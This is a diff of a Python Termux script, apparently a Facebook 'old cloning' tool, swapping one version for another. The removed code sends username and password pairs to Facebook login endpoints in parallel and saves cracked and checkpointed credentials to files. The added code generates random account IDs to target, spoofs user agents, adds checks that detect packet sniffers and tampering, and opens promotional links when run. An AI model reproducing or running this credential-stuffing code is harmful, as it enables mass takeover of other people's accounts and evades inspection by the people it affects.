@@ -1,386 +1,591 @@
-#!/usr/bin/env python3
-# CYBER OLD CLONING TOOL BY CYBER-API
-# TERMUX DEPLOYMENT READY
-# FULL FEATURES - NO SHORTCUTS
-
-import os,sys,re,json,time,random,uuid,string,platform,urllib.request,requests,calendar,threading,base64,zlib
-from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import quote
-import subprocess
+import os
+import re
+import time
+import uuid
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
 from datetime import datetime
 
-try:
-    import requests
-except ImportError:
-    os.system('pip install requests')
-    import requests
+import os, sys
 
-GREEN = '\033[1;32m'
-RED = '\033[1;31m'
-BLUE = '\033[1;34m'
-YELLOW = '\033[1;33m'
-PURPLE = '\033[1;35m'
-CYAN = '\033[1;36m'
-WHITE = '\033[1;37m'
-BOLD = '\033[1m'
-END = '\033[0m'
+os.system('xdg-open https://www.youtube.com/@Alirafiq29 ')
+os.system('xdg-open https://chat.whatsapp.com/CX8lntoDSts5AyuCydMMXf?mode=wwc')
+os.system('xdg-open https://www.facebook.com/BaLoch0654')
 
-def c():
-    os.system('clear')
-def h():
-    os.system('cls')
-def banner():
-    c()
-    print(f'''{PURPLE}
-╔══════════════════════════════════════╗
-║        𓆩【CYBER 👑 】𓆪             ║
-║     CYBER OLD CLONING TOOL v2.0     ║
-║        TERMUX READY - 2026          ║
-╚══════════════════════════════════════╝{END}''')
 
-def get_device_key():
-    mac = uuid.getnode()
-    timestamp = str(int(time.time()))
-    random_hex = ''.join(random.choices(string.hexdigits.lower(), k=8))
-    key = f"CYBER{random_hex}{timestamp[:4]}{random_hex[:6].upper()}"
-    return key
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import sys
+import subprocess
+import shutil
+import time
 
-def check_key(key):
-    try:
-        url = "https://raw.githubusercontent.com/cyber-api/Old-cloning/refs/heads/main/approve.txt"
-        response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            approved_keys = response.text.strip().split('\n')
-            return key in approved_keys
-        return False
-    except:
-        return False
+# Your WhatsApp channel link
+channel_link = "https://whatsapp.com/channel/0029VbAjFyMFXUudqKqwkN3B"
 
-def key_system():
-    banner()
-    print(f"{YELLOW}🔑 CYBER DEVICE KEY SYSTEM{END}")
-    print(f"{CYAN}Generating unique per-device key...{END}")
-    time.sleep(2)
-    
-    key = get_device_key()
-    print(f"{GREEN}✅ Your CYBER Key: {BOLD}{key}{END}")
-    
-    print(f"{BLUE}📱 Checking approval status...{END}")
-    time.sleep(3)
-    
-    if check_key(key):
-        print(f"{GREEN}✅ APPROVED! Welcome to CYBER Tools{END}")
-        print(f"{YELLOW}🔗 Join for updates:{END}")
-        print(f"{CYAN}📢 FB Group: https://facebook.com/groups/cyberapi{END}")
-        print(f"{CYAN}📱 Telegram: https://t.me/cyber_api_channel{END}")
-        time.sleep(5)
-        return True
+# Valid keys (cleaned - no trailing space)
+approved_keys = [
+    "mahbub ullash"
+]
+
+# ANSI color codes
+GREEN = "\033[1;32m"
+RESET = "\033[0m"
+
+# Optional: max attempts and cooldown
+MAX_ATTEMPTS = 3
+COOLDOWN_SECONDS = 8
+
+def clear_screen():
+    os.system("clear")
+
+def open_link(url):
+    # prefer termux-open-url, fallback to xdg-open, then Android intent
+    if shutil.which("termux-open-url"):
+        subprocess.run(["termux-open-url", url], check=False)
+    elif shutil.which("xdg-open"):
+        subprocess.run(["xdg-open", url], check=False)
     else:
-        print(f"{RED}❌ Key not approved{END}")
-        print(f"{YELLOW}➤ Add this key to approve.txt:{END}")
-        print(f"{GREEN}{BOLD}{key}{END}")
-        print(f"{CYAN}📤 GitHub: https://github.com/cyber-api/Old-cloning{END}")
-        print(f"{CYAN}📢 FB: https://facebook.com/cyberapi{END}")
-        print(f"{CYAN}📱 TG: https://t.me/cyber_api_channel{END}")
-        input(f"{RED}Press Enter after adding key...")
-        return key_system()
+        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
 
-def security_check():
-    if os.path.exists('/system/bin/HTTPCanary') or 'HTTPCanary' in os.popen('ps aux').read():
-        print(f"{RED}❌ HTTPCanary detected! Exiting...{END}")
-        sys.exit()
-    
-    if platform.system() == "Windows":
-        if os.system('tasklist | findstr "Fiddler" >nul') == 0:
-            print(f"{RED}❌ Fiddler detected! Exiting...{END}")
-            sys.exit()
-    
+def normalize(s):
+    """
+    Normalize string for comparison:
+    - strip leading/trailing whitespace
+    - collapse multiple internal spaces to single
+    - lower-case for case-insensitive compare
+    """
+    if s is None:
+        return ""
+    return " ".join(s.split()).lower()
+
+# Prepare a set of normalized approved keys for fast compare
+approved_normalized = { normalize(k) for k in approved_keys }
+
+def first_step():
+    clear_screen()
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(f"        {GREEN}🔒 Script Locked 🔒{RESET}")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+    print(f"{GREEN} THIS TOOL IS PAID ✅ {RESET}\n")
+    print("Please open the admin/channel on WhatsApp first and then get the key.\n")
+    print(f"Channel link: {channel_link}\n")
+
+    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
+        print("Invalid link format — URL must start with http/https.")
+    else:
+        try:
+            open_link(channel_link)
+            print("Tried to open the channel. If WhatsApp doesn't open automatically, check manually.")
+        except Exception as e:
+            print(f"Error while opening link: {e}")
+
+    input("\nPress Enter when you're ready...")
+
+def check_key():
+    attempts = 0
+    while attempts < MAX_ATTEMPTS:
+        # VISIBLE input now (not hidden)
+        user_key = input("\nEnter your key (visible): ")
+        user_norm = normalize(user_key)
+        if user_norm in approved_normalized:
+            print(f"\n{GREEN}Key approved! Script is running...{RESET}\n")
+            return True
+        else:
+            attempts += 1
+            remaining = MAX_ATTEMPTS - attempts
+            print(f"\n{GREEN}Invalid key! Attempts left: {remaining}{RESET}")
+    # cooldown then exit
+    print(f"\n[!] Too many wrong attempts. Wait {COOLDOWN_SECONDS} seconds.")
+    time.sleep(COOLDOWN_SECONDS)
+    sys.exit(1)
+
+if __name__ == "__main__":
+    first_step()
+    check_key()
+    # ---------- main tool starts here ----------
+    print(">>> Tool Successfully Unlocked <<<")
+    # place your main code below
+
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
     try:
-        requests.get("https://httpbin.org/ip", timeout=5)
-    except:
-        print(f"{RED}❌ No internet connection!{END}")
-        sys.exit()
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
 
-def anti_tamper():
-    current_code = '''CYBER OLD CLONING TOOL BY CYBER-API'''
-    with open(__file__, 'r') as f:
-        content = f.read()
-    if current_code not in content:
-        print(f"{RED}❌ Script tampered! Restoring...{END}")
-        sys.exit()
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+
+# Initial setup and promotion
+os.system('clear')
+print(' \x1b[38;5;46m ALi 🫶🏻 🔥 SERVER LOADING....')
+
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+
+
+# --- Anti-tampering and Security Checks ---
+# The script checks if the source code of the 'requests' library has been modified
+# or if packet sniffing tools are being used.
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
+
+
+class sec:
+    """
+    A security class to detect debugging and packet sniffing tools.
+    """
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        # Paths to check for modifications
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if 'print' in open(path, 'r').read():
+                self.fuck()
+        # Check for HTTPCanary (a packet sniffing app)
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        """
+        Terminates the script if tampering is detected.
+        """
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+
+# Color codes for terminal output
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
 
 def windows():
-    uas = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'
-    ]
-    return random.choice(uas)
+    """
+    Generates a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
 
 def window1():
-    uas = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/82.0.4585.40'
-    ]
-    return random.choice(uas)
+    """
+    Generates another variant of a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
 
-def creationyear():
-    years = ['2010','2011','2012','2013','2014','2015','2016','2017','2018','2019']
-    return random.choice(years)
 
-def get_token1(id,pwd,sess):
-    global ok,cp,token
-    try:
-        ua = windows()
-        ses = requests.Session()
-        ses.headers.update({'User-Agent': ua})
-        
-        data = {
-            'email': id,
-            'pass': pwd,
-            'errors': '{}',
-            'error_detail': '{}',
-            'source': 'device_based_reg_endpoint',
-            'lsd': 'AVpQ7Dd7EoY',
-            'jazoest': '25322',
-            'email_tags': '{}',
-            'birthday_today': '6',
-            'birthday_month': '2',
-            'birthday_year': creationyear(),
-            'reg_instance': '{}',
-            'registration_may_be_derived': '1',
-            'try_number': '0',
-            'prefill_contact_point': '{}',
-            'prefill_source': '{}',
-            'prefill_type': '',
-            'first_prefill_source': '{}',
-            'first_prefill_type': '',
-            'source_path': 'sig_initiated'
-        }
-        
-        qs = 'lsd=AVpQ7Dd7EoY&jazoest=25322&uid=&first_name=&last_name=&firstnamephonetic=&lastnamephonetic=&reg_instance=&registration_may_be_derived=&try_number=0&email=%s&email_tags=%s&password=%s&birthday_day=6&birthday_month=2&birthday_year=%s&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&source=login&source_path=sig_initiated&email_tags_6xbw8mig=&lsd=AVpQ7Dd7EoY'%(quote(id),quote('{}'),quote(pwd),creationyear())
-        
-        header = {
-            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language':'en-US,en;q=0.9',
-            'cache-control':'max-age=0',
-            'content-type':'application/x-www-form-urlencoded',
-            'origin':'https://www.facebook.com',
-            'referer':'https://www.facebook.com/',
-            'sec-ch-prefers-color-scheme':'light',
-            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile':'?0',
-            'sec-ch-ua-platform':'"Windows"',
-            'sec-fetch-dest':'document',
-            'sec-fetch-mode':'navigate',
-            'sec-fetch-site':'same-origin',
-            'sec-fetch-user':'?1',
-            'upgrade-insecure-requests':'1',
-            'user-agent':ua
-        }
-        
-        req = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&preserve_login=true',data=data,headers=header,allow_redirects=False,follow_redirects=False,timeout=20)
-        if 'c_user' in sess.cookies.get_dict():
-            print(f"\r{GREEN}CYBER-M1{END} => {id}:{pwd} {GREEN}OK{END}")
-            ok.append(id+'|'+pwd)
-            open('/sdcard/CYBER-OLD-M1-OK.txt','a').write(id+'|'+pwd+'\n')
-            token = sess.cookies.get_dict()['c_user']
-        if 'checkpoint' in req.url:
-            print(f"\r{RED}CYBER-M1{END} => {id}:{pwd} {RED}CP{END}")
-            cp.append(id+'|'+pwd)
-            open('/sdcard/CYBER-OLD-M1-CP.txt','a').write(id+'|'+pwd+'\n')
-    except:
-        pass
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【HERO 👑 】𓆪 \x07')
 
-def get_token2(id,pwd,sess):
-    global ok,cp,token
-    try:
-        ua = window1()
-        ses = requests.Session()
-        ses.headers.update({'User-Agent': ua})
+
+    # AHB Clover Logo - Green - Version 2.5
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    
+    print("""\033[1;32m
         
-        data = {
-            'lsd': 'AVrHDNB4LxR',
-            'jazoest': '25702',
-            'm_ts': str(int(time.time())),
-            'li': 'yJpWWe4C7OjqoQ5G-AaJseLF',
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': id,
-            'pass': pwd,
-            'login': 'Log In'
-        }
-        
-        header = {
-            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language':'en-US,en;q=0.9',
-            'cache-control':'max-age=0',
-            'content-type':'application/x-www-form-urlencoded',
-            'origin':'https://www.facebook.com',
-            'referer':'https://www.facebook.com/',
-            'sec-ch-prefers-color-scheme':'light',
-            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile':'?0',
-            'sec-ch-ua-platform':'"Windows"',
-            'sec-fetch-dest':'document',
-            'sec-fetch-mode':'navigate',
-            'sec-fetch-site':'same-origin',
-            'sec-fetch-user':'?1',
-            'upgrade-insecure-requests':'1',
-            'user-agent':ua
-        }
-        
-        req = ses.post('https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Flogin%2Fsave-device%2F',data=data,headers=header,allow_redirects=False,timeout=20)
-        if 'c_user' in sess.cookies.get_dict():
-            print(f"\r{GREEN}CYBER-M2{END} => {id}:{pwd} {GREEN}OK{END}")
-            ok.append(id+'|'+pwd)
-            open('/sdcard/CYBER-OLD-M2-OK.txt','a').write(id+'|'+pwd+'\n')
-            token = sess.cookies.get_dict()['c_user']
-        if 'checkpoint' in req.url:
-            print(f"\r{RED}CYBER-M2{END} => {id}:{pwd} {RED}CP{END}")
-            cp.append(id+'|'+pwd)
-            open('/sdcard/CYBER-OLD-M2-CP.txt','a').write(id+'|'+pwd+'\n')
-    except:
-        pass
+   
+      ░█████╗░  ██╗░░██╗  ██████╗░
+      ██╔══██╗  ██║░░██║  ██╔══██╗
+      ███████║  ███████║  ██████╦╝
+      ██╔══██║  ██╔══██║  ██╔══██╗
+      ██║░░██║  ██║░░██║  ██████╦╝
+      ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
 
-def old_clone():
-    global ok,cp,token
-    ok = []
-    cp = []
-    token = []
-    
-    print(f"{YELLOW}Enter file path (e.g. /sdcard/ids.txt): {END}",end='')
-    try:
-        file = input(' ')
-        clear()
-        print(f'{CYAN}File loaded: {file}{END}\n')
-        print(f'{YELLOW}How many threads? (30 recommended): {END}',end='')
-        threa = int(input(' '))
-    except:
-        print(f'{RED}Invalid input!')
-        exit()
-    
-    fl = open(file,'r').read().splitlines()
-    print(f'\n{YELLOW}Total IDs loaded: {len(fl)}{END}')
-    
-    with ThreadPoolExecutor(max_workers=threa) as (_):
-        print(f'{BLUE}[ CYBER ] Starting cracking...{END}\n')
-        for user in fl:
-            uid,pwd = user.split('|')
-            try:
-                pws = pwd.split(',')
-                for pw in pws:
-                    get_token1(uid,pw,None)
-                    get_token2(uid,pw,None)
-            except:
-                pass
+\033[0m""")
 
-def old_One():
-    global ok,cp,token
-    ok = []
-    cp = []
-    token = []
-    
-    print(f"{YELLOW}Method A - Windows UA + Device Login{END}")
-    print(f"{CYAN}Enter file path: {END}",end='')
-    file = input(' ')
-    clear()
-    
-    fl = open(file,'r').read().splitlines()
-    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
-    
-    with ThreadPoolExecutor(max_workers=30) as (_):
-        for user in fl:
-            uid,pwd = user.split('|')
-            get_token1(uid,pwd,None)
 
-def old_Tow():
-    global ok,cp,token
-    ok = []
-    cp = []
-    token = []
-    
-    print(f"{YELLOW}Method B - Chrome UA + Regular Login{END}")
-    print(f"{CYAN}Enter file path: {END}",end='')
-    file = input(' ')
-    clear()
-    
-    fl = open(file,'r').read().splitlines()
-    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
-    
-    with ThreadPoolExecutor(max_workers=30) as (_):
-        for user in fl:
-            uid,pwd = user.split('|')
-            get_token2(uid,pwd,None)
+def creationyear(uid):
+    """
+    Estimates the Facebook account creation year based on the UID.
+    """
+    if len(uid) == 15:
+        if uid.startswith('1000000000'):
+            return '2009'
+        if uid.startswith('100000000'):
+            return '2009'
+        if uid.startswith('10000000'):
+            return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+            return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
+            return '2010'
+        if uid.startswith('100001'):
+            return '2010'
+        if uid.startswith(('100002', '100003')):
+            return '2011'
+        if uid.startswith('100004'):
+            return '2012'
+        if uid.startswith(('100005', '100006')):
+            return '2013'
+        if uid.startswith(('100007', '100008')):
+            return '2014'
+        if uid.startswith('100009'):
+            return '2015'
+        if uid.startswith('10001'):
+            return '2016'
+        if uid.startswith('10002'):
+            return '2017'
+        if uid.startswith('10003'):
+            return '2018'
+        if uid.startswith('10004'):
+            return '2019'
+        if uid.startswith('10005'):
+            return '2020'
+        if uid.startswith('10006'):
+            return '2021'
+        if uid.startswith('10009'):
+            return '2023'
+        if uid.startswith(('10007', '10008')):
+            return '2022'
+        return ''
+    elif len(uid) in (9, 10):
+        return '2008'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) == 7:
+        return '2006'
+    elif len(uid) == 14 and uid.startswith('61'):
+        return '2024'
+    else:
+        return ''
 
-def old_Tree():
-    global ok,cp,token
-    ok = []
-    cp = []
-    token = []
-    
-    print(f"{YELLOW}Method A+B - Dual Attack{END}")
-    print(f"{CYAN}Enter file path: {END}",end='')
-    file = input(' ')
-    clear()
-    
-    fl = open(file,'r').read().splitlines()
-    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
-    
-    with ThreadPoolExecutor(max_workers=30) as (_):
-        for user in fl:
-            uid,pwd = user.split('|')
-            try:
-                pws = pwd.split(',')
-                for pw in pws:
-                    get_token1(uid,pw,None)
-                    get_token2(uid,pw,None)
-            except:
-                pass
 
 def clear():
-    if os.name == 'nt':
-        h()
-    else:
-        c()
+    os.system('clear')
 
-def menu():
-    banner()
-    print(f'''{GREEN}╔══════════════════════════════════════╗{END}
-{BLUE}║{END} {WHITE}1. {CYAN}old_clone (All Methods){END}         {BLUE}║{END}
-{BLUE}║{END} {WHITE}2. {CYAN}old_One (Method A){END}             {BLUE}║{END}
-{BLUE}║{END} {WHITE}3. {CYAN}old_Tow (Method B){END}             {BLUE}║{END}
-{BLUE}║{END} {WHITE}4. {CYAN}old_Tree (A+B Dual){END}           {BLUE}║{END}
-{BLUE}║{END} {WHITE}5. {RED}Exit{END}                          {BLUE}║{END}
-{GREEN}╚══════════════════════════════════════╝{END}''')
-    select()
 
-def select():
-    print(f"\n{YELLOW}Choose option » {END}",end='')
-    opt = input()
-    if opt == '1':
+def linex():
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+def BNG_71_():
+    """
+    Main menu function.
+    """
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
+    linex()
+    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
+    if __Jihad__ in ('A', 'a', '01', '1'):
         old_clone()
-    elif opt == '2':
-        old_One()
-    elif opt == '3':
-        old_Tow()
-    elif opt == '4':
-        old_Tree()
-    elif opt == '5':
-        clear()
-        banner()
-        print(f"{GREEN}Thanks for using CYBER Tools! 👑{END}")
-        exit()
     else:
-        print(f'{RED}Invalid option!{END}')
+        print(f"\n    {rad}Choose Valid Option... ")
         time.sleep(2)
-        menu()
+        BNG_71_()
+
+
+def old_clone():
+    """
+    Menu for selecting old account cloning type.
+    """
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
+    linex()
+    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
+    if _input in ('A', 'a', '01', '1'):
+        old_One()
+    elif _input in ('B', 'b', '02', '2'):
+        old_Tow()
+    elif _input in ('C', 'c', '03', '3'):
+        old_Tree()
+    else:
+        print(f"\n[×]{rad} Choose Value Option... ")
+        BNG_71_()
+
+
+def old_One():
+    """
+    Cloning method for accounts from 2010-2014.
+    """
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def old_Tow():
+    """
+    Cloning method for accounts with specific prefixes.
+    """
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
+    linex()
